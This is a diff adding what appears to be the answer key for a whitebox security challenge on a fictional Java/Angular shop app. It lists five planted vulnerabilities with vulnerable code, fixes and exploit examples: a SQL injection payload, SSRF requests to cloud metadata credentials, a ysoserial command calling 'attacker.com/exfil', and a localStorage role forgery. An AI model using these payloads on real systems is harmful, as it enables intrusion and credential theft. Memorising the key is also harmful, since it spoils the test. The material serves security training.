@@ -1,0 +1,156 @@
+category_id: 1
+category_name: "Security - Whitebox"
+total_bugs: 5
+
+bugs:
+  - id: "bug-1"
+    challenge_id: "cat1-easy"
+    difficulty: "easy"
+    type: "SQL Injection"
+    cwe: "CWE-89"
+    severity: "critical"
+    title: "SQL Injection via string concatenation in user search"
+    description: |
+      The UserService.searchUsers method constructs a native SQL query by directly
+      concatenating user-supplied input (searchTerm) into the query string. This allows
+      an attacker to inject arbitrary SQL via the search endpoint.
+    file: "app/src/main/java/com/techmart/service/UserService.java"
+    line: 68
+    vulnerable_code: |
+      String sql = "SELECT * FROM users WHERE (username LIKE '%" + searchTerm + "%' " +
+              "OR email LIKE '%" + searchTerm + "%' " +
+              "OR full_name LIKE '%" + searchTerm + "%') " +
+              "AND is_active = true " +
+              "ORDER BY " + request.getSortBy() + " " + request.getSortDirection();
+    entry_point: "POST /api/users/search with UserSearchRequest body"
+    exploit_example: |
+      POST /api/users/search
+      {"searchTerm": "' OR 1=1 UNION SELECT * FROM users WHERE role='ADMIN' --"}
+    fix: "Use parameterized queries with EntityManager.createNativeQuery and setParameter, or use Spring Data JPA Specifications/Criteria API"
+    verification: "Search for string concatenation in SQL query construction within UserService"
+
+  - id: "bug-2"
+    challenge_id: "cat1-medium"
+    difficulty: "medium"
+    type: "Broken Access Control"
+    cwe: "CWE-862"
+    severity: "high"
+    title: "Admin endpoints accessible without role-based authorization"
+    description: |
+      The SecurityConfig.java does not restrict access to /api/admin/** endpoints
+      based on user roles. The .anyRequest().authenticated() rule means any
+      authenticated user (not just admins) can access admin endpoints like
+      user management and application settings.
+    file: "app/src/main/java/com/techmart/config/SecurityConfig.java"
+    line: 27
+    vulnerable_code: |
+      .authorizeHttpRequests(auth -> auth
+          .requestMatchers("/api/auth/**").permitAll()
+          .requestMatchers("/api/products/**").permitAll()
+          .requestMatchers("/api/users/search").authenticated()
+          .requestMatchers("/api/users/**").authenticated()
+          .requestMatchers("/api/reports/**").authenticated()
+          .requestMatchers("/api/session/**").permitAll()
+          .requestMatchers("/actuator/health").permitAll()
+          .anyRequest().authenticated()
+      )
+    related_file: "app/src/main/java/com/techmart/controller/AdminController.java"
+    entry_point: "GET /api/admin/users, GET /api/admin/settings, PUT /api/admin/settings"
+    exploit_example: |
+      Any authenticated user (role=USER) can call:
+      GET /api/admin/settings - reveals SMTP config, DB pool size
+      PUT /api/admin/users/1/role - escalate any user to ADMIN
+    fix: "Add .requestMatchers(\"/api/admin/**\").hasRole(\"ADMIN\") before the .anyRequest() rule, or add @PreAuthorize(\"hasRole('ADMIN')\") to AdminController"
+    verification: "Check SecurityConfig for missing /api/admin/** role restriction"
+
+  - id: "bug-3"
+    challenge_id: "cat1-hard"
+    difficulty: "hard"
+    type: "Server-Side Request Forgery (SSRF)"
+    cwe: "CWE-918"
+    severity: "high"
+    title: "SSRF via unvalidated header image URL in report generation"
+    description: |
+      The ReportService.fetchHeaderImage method takes a user-supplied URL from
+      the ReportRequest.headerImageUrl field and opens a connection to it using
+      URL.openStream() without any validation. An attacker can use this to make
+      the server send HTTP requests to arbitrary internal or external hosts.
+    file: "app/src/main/java/com/techmart/service/ReportService.java"
+    line: 54
+    vulnerable_code: |
+      URL url = new URL(headerImageUrl);
+      try (InputStream inputStream = url.openStream();
+           ByteArrayOutputStream buffer = new ByteArrayOutputStream()) {
+    entry_point: "POST /api/reports/generate with ReportRequest body containing headerImageUrl"
+    exploit_example: |
+      POST /api/reports/generate
+      {"title":"test","reportType":"SALES_SUMMARY","headerImageUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+      or
+      {"title":"test","reportType":"SALES_SUMMARY","headerImageUrl":"http://localhost:8080/api/admin/settings"}
+    fix: "Validate URLs against an allowlist of domains/protocols, block private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, localhost), and restrict to HTTPS only"
+    verification: "Check ReportService.fetchHeaderImage for URL validation before openStream"
+
+  - id: "bug-4"
+    challenge_id: "cat1-difficult"
+    difficulty: "difficult"
+    type: "Insecure Deserialization"
+    cwe: "CWE-502"
+    severity: "critical"
+    title: "Remote code execution via unsafe Java deserialization of session data"
+    description: |
+      The SessionService.getSessionData method deserializes Base64-encoded data
+      using ObjectInputStream.readObject() without any deserialization filter or
+      class whitelist. The /api/session/restore endpoint directly passes
+      user-controlled data to this method. An attacker can send a crafted
+      serialized Java object (using gadget chains like Commons Collections)
+      to achieve remote code execution.
+    file: "app/src/main/java/com/techmart/service/SessionService.java"
+    line: 33
+    vulnerable_code: |
+      byte[] data = Base64.getDecoder().decode(serializedData);
+      ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
+      Object obj = ois.readObject();
+    related_file: "app/src/main/java/com/techmart/controller/SessionController.java"
+    entry_point: "POST /api/session/restore with Base64-encoded serialized Java object"
+    exploit_example: |
+      Generate payload with ysoserial:
+      java -jar ysoserial.jar CommonsCollections6 "curl http://attacker.com/exfil" | base64
+      POST /api/session/restore {"sessionData":"<base64-encoded-payload>"}
+    fix: "Replace Java serialization with JSON (Jackson/Gson), or implement ObjectInputFilter to whitelist allowed classes (java.util.HashMap, java.lang.String)"
+    verification: "Check SessionService for ObjectInputStream.readObject usage on user-controlled input"
+
+  - id: "bug-5"
+    challenge_id: "cat1-hidden"
+    difficulty: "hidden"
+    type: "Privilege Escalation via Client-Side Authorization Bypass"
+    cwe: "CWE-602"
+    severity: "high"
+    title: "Admin access controlled only by client-side localStorage check"
+    description: |
+      The Angular admin route guard (admin.guard.ts) and admin component
+      (admin.component.ts) both rely solely on localStorage.getItem('role')
+      to determine admin access. Combined with the missing server-side role
+      check on /api/admin/** endpoints (Bug 2), this creates a complete
+      authorization bypass. A regular user can set localStorage.role='admin'
+      in the browser console to see the admin UI, and the API calls will
+      succeed because the backend has no role-based restrictions either.
+    file: "app/src/frontend/src/app/guards/admin.guard.ts"
+    line: 20
+    vulnerable_code: |
+      const userRole = localStorage.getItem('role');
+      if (userRole === 'admin') {
+        return true;
+      }
+    related_files:
+      - "app/src/frontend/src/app/pages/admin/admin.component.ts"
+      - "app/src/main/java/com/techmart/config/SecurityConfig.java"
+      - "app/src/main/java/com/techmart/controller/AdminController.java"
+    entry_point: "Browser console: localStorage.setItem('role', 'admin'); then navigate to /admin"
+    exploit_example: |
+      1. Log in as a regular user
+      2. Open browser DevTools console
+      3. Run: localStorage.setItem('role', 'admin')
+      4. Navigate to /admin - the Angular guard passes
+      5. All admin API calls succeed because backend lacks role checks
+    fix: "The route guard should verify role via a server-side API call (GET /api/auth/profile), and the backend must enforce role checks on /api/admin/** endpoints"
+    verification: "Check admin.guard.ts for localStorage-only auth and cross-reference with SecurityConfig for missing server-side role enforcement"
